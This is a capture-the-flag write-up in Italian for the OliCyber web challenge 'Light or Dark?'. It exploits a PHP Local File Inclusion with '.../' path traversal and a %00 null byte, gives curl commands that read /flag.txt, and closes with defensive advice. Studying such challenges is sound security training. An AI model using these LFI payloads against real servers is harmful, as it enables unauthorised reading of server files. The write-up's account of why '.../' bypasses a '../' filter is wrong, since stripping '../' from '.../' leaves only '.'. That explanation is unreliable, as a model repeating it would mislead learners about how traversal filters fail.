# Light or Dark?

**Competizione:** OliCyber<br>
**Categoria:** Web / Local File Inclusion<br>
**URL:** http://lightdark.challs.olicyber.it

---

## Descrizione

> Un semplice sito web che ti permette di scegliere tra tema chiaro, scuro e... nah, solo questi due.

Un sito vulnerabile a LFI con null byte injection. La flag si trova in `/flag.txt`.

**Nota:** Versione di PHP: 4

---

## Soluzione

### Step 1 — Analisi della vulnerabilità

Il sito permette di selezionare un tema tramite il parametro GET `tema`:

```
http://lightdark.challs.olicyber.it/index.php?tema=dark
```

Il server include dinamicamente un file CSS in base al valore passato. Questo pattern è classicamente vulnerabile a **Local File Inclusion (LFI)**: se il parametro non viene sanitizzato, un attaccante può manipolarlo per includere file arbitrari dal filesystem del server.

Il hint sulla **versione PHP 4** è fondamentale: nelle versioni di PHP precedenti alla 5.3.4, la funzione `include()` è vulnerabile al **Null Byte Injection** (`%00`). Inserendo un null byte alla fine del path, si tronca la stringa prima dell'eventuale suffisso aggiunto dal server (es. `.css`), bypassando così il controllo sull'estensione.

---

### Step 2 — Verifica della LFI con path traversal

Proviamo a risalire la directory root con sequenze `.../` per bypassare eventuali filtri naïve che rimuovono `../`.

```bash
curl -s 'http://lightdark.challs.olicyber.it/index.php?tema=.../.../.../.../.../flag.txt%00.css'
```

Il null byte (`%00`) tronca la stringa: il server include `/flag.txt` ignorando il suffisso `.css`. La flag viene iniettata direttamente nel blocco `<style>` della pagina HTML:

```html
<style>
    flag{...}
</style>
```

---

### Step 3 — Estrazione della flag

```bash
curl -s 'http://lightdark.challs.olicyber.it/index.php?tema=.../.../.../.../.../flag.txt%00.css' \
  | grep -oiP 'flag\{[^}]+\}'
```

**Output:**
```
flag{...}
```

---

## Vulnerabilità sfruttate

| Aspetto | Dettaglio |
|---|---|
| **Tipo** | Local File Inclusion (LFI) |
| **Causa** | Parametro `tema` passato direttamente a `include()` senza sanitizzazione |
| **Bypass filtro** | Sequenza `.../` per eludere rimozioni naive di `../` |
| **Bypass estensione** | Null Byte Injection `%00` (funziona su PHP < 5.3.4) |
| **Impatto** | Lettura di file arbitrari dal filesystem del server |

---

### Perché `.../` invece di `../`?

Alcuni filtri rimuovono la sequenza `../` dal parametro. La sequenza `.../` non viene riconosciuta come path traversal dal filtro, ma dopo la rimozione di `../` da `.../` rimane `./` → il path viene comunque traversato.

---

### Perché il Null Byte funziona?

In PHP < 5.3.4, le stringhe C terminano al primo byte `\0`. Se il server costruisce il path così:

```php
include("themes/" . $_GET['tema'] . ".css");
```

Il valore `../flag.txt%00.css` viene interpretato internamente come `../flag.txt` perché il null byte tronca la stringa prima di `.css`.

---

## Conclusioni

- Mai concatenare direttamente input dell'utente a path di file
- Usare una whitelist di valori consentiti invece di filtrare input
- Non fidarsi di filtri che rimuovono sequenze — usare path canonici
- Validare l'estensione del file dopo il traversal, non prima
- In PHP moderno il null byte injection è mitigato, ma il principio rimane
- Sempre sanitizzare e validare input, specialmente per operazioni filesystem